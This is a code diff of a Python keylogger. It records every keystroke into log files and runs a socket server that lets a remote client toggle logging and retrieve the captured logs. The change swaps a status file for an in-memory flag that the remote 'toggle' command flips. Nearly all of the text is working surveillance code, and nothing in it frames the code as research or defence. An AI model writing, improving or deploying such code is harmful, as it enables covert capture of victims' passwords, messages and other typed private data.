@@ -24,6 +24,7 @@ ADDR: tuple[str, int] = (SERVER, PORT)
 FORMAT: str = "utf-8"
 DISCONNECTED_MESSAGE: str = "DISCONNECT"
 
+enabled: bool = True
 
 try:
     os.mkdir(MAINFOLDER+FOLDERNAME)
@@ -34,35 +35,19 @@ logging.basicConfig(filename=f"{MAINFOLDER}{FOLDERNAME}/{time.strftime('%Y-%m-%d
 
 
 def loggingThread():
+    global enabled
     def onPress(key):
-        logging.info(str(key))
+        if enabled:
+            logging.info(str(key))
 
     with Listener(on_press=onPress) as listener:
-        status = queryStatus()
-        if status:
-            listener.join()
-        else:
-            logthread.join()
+        listener.join()
 
 
 STATUSFILE: str = f"{MAINFOLDER}dir.txt"
 with open(STATUSFILE, "w+") as f:
     f.write("enabled")
 
-
-def queryStatus() -> bool:
-    with open(STATUSFILE) as f:
-        status: str = f.read()
-    if status == "enabled":
-        return True
-    else:
-        return False
-
-
-def setStatus(status: str) -> None:
-    print(status)
-    with open(STATUSFILE, "w+") as f:
-        f.write(status)
 
 
 logthread: threading.Thread = threading.Thread(target=loggingThread)
@@ -74,6 +59,7 @@ server.bind(ADDR)
 
 
 def handleConnection(conn, addr) -> None:
+    global enabled
     connected: bool = True
     while connected:
         msg_length: any = conn.recv(HEADER).decode(FORMAT)
@@ -81,11 +67,8 @@ def handleConnection(conn, addr) -> None:
             msg_length = int(msg_length)
             msg: str = conn.recv(msg_length).decode(FORMAT)
             if msg == "toggle":
-                status: bool = queryStatus()
-                if status:
-                    setStatus("disabled")
-                else:
-                    setStatus("enabled")
+                enabled = not enabled
+                print(enabled)
             elif msg == "logs":
                 allLogs = os.listdir(f"{MAINFOLDER}/temp")
                 conn.send(str(len(allLogs)).encode(FORMAT))
